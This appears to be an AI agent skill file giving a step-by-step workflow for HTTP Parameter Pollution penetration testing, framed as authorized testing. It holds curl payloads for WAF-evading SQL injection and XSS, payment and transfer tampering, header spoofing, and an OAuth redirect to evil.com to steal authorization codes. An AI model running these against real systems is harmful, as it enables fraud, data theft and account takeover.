---
name: performing-http-parameter-pollution-attack
description: "Execute HTTP Parameter Pollution attacks that inject duplicate request parameters. Signals: web vulnerability, injection, sql injection."
zh-signals: "Executes HTTP Parameter Pollution attacks that inject duplicate request 信号:web漏洞,注入,sql注入。"
when-to-use: Executes HTTP Parameter Pollution attacks that inject duplicate request
  parameters to bypass input validation, WAF rules, and other security controls when
  front-end and back-end systems parse duplicate parameters differently. Use during
  web application penetration testing to test for parameter parsing inconsistencies
  or WAF/validation bypass.
domain: cybersecurity
subdomain: web-application-security
tags:
- http-parameter-pollution
- hpp
- waf-bypass
- input-validation
- web-security
- parameter-injection
- server-parsing
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1055
---

# Performing HTTP Parameter Pollution Attack

## When to Use
- When testing web applications for input validation bypass vulnerabilities
- During WAF evasion testing to split attack payloads across duplicate parameters
- When assessing how different technology stacks handle duplicate HTTP parameters
- During API security testing to identify parameter precedence issues
- When testing OAuth or payment processing flows for parameter manipulation

## Prerequisites
- Burp Suite Professional with Intruder and Repeater modules
- Understanding of HTTP protocol and query string parsing
- Knowledge of server-side parameter handling differences (first, last, array, concatenated)
- cURL or httpie for manual parameter crafting
- Target application technology stack identification (Apache, IIS, Tomcat, Node.js, etc.)


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1 — Identify Parameter Handling Behavior
```bash
# Test how the server handles duplicate parameters
# Different servers process duplicates differently:
# Apache/PHP: Last parameter value
# ASP.NET/IIS: All values concatenated with comma
# JSP/Tomcat: First parameter value
# Node.js/Express: Array of values
# Python/Flask: First parameter value

curl -v "http://target.com/search?q=first&q=second"
# Observe which value the application uses in the response

# Test POST body duplicate parameters
curl -X POST http://target.com/api/action \
  -d "amount=100&amount=1"
```

### Step 2 — Perform Server-Side HPP
```bash
# Bypass input validation by splitting payload
# Original blocked payload: id=1 OR 1=1
curl "http://target.com/api/user?id=1%20OR%201%3D1"  # Blocked by WAF

# HPP bypass: split across duplicate parameters
curl "http://target.com/api/user?id=1%20OR&id=1%3D1"  # May bypass WAF

# Parameter pollution in POST body
curl -X POST http://target.com/transfer \
  -d "to_account=victim&amount=100&to_account=attacker"

# Override security-critical parameters
curl -X POST http://target.com/api/payment \
  -d "price=99.99&currency=USD&price=0.01"
```

### Step 3 — Perform Client-Side HPP
```bash
# Client-side HPP via URL manipulation
# If application reflects parameters in links:
# Original: http://target.com/page?param=value
# Inject:   http://target.com/page?param=value%26injected_param=evil_value

# Social sharing URL manipulation
curl "http://target.com/share?url=http://legit.com%26callback=http://evil.com"

# Inject into embedded links
curl "http://target.com/redirect?url=http://trusted.com%26token=stolen_value"
```

### Step 4 — Bypass WAF Rules Using HPP
```bash
# WAF typically inspects individual parameter values
# Split SQL injection across parameters
curl "http://target.com/search?q=1' UNION&q=SELECT password FROM users--"

# Split XSS payload
curl "http://target.com/search?q=<script>&q=alert(1)</script>"

# URL-encoded HPP bypass
curl "http://target.com/api/data?filter=admin%26role=superadmin"

# HPP in HTTP headers
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-For: attacker-ip" \
     http://target.com/api/admin
```

### Step 5 — Test OAuth and Payment Flow HPP
```bash
# OAuth authorization code HPP
# Inject duplicate redirect_uri to steal authorization code
curl "http://target.com/oauth/authorize?client_id=legit&redirect_uri=https://legit.com/callback&redirect_uri=https://evil.com/steal"

# Payment amount manipulation
curl -X POST http://target.com/api/checkout \
  -d "item=product1&price=100&quantity=1&price=1"

# Coupon code HPP
curl -X POST http://target.com/api/apply-coupon \
  -d "coupon=SAVE10&coupon=SAVE90&coupon=FREE"
```

### Step 6 — Automate HPP Testing
```bash
# Use Burp Intruder with parameter duplication
# In Burp Repeater, manually add duplicate parameters
# Use param-miner Burp extension for automated discovery

# Test with OWASP ZAP HPP scanner
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' \
  http://target.com

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
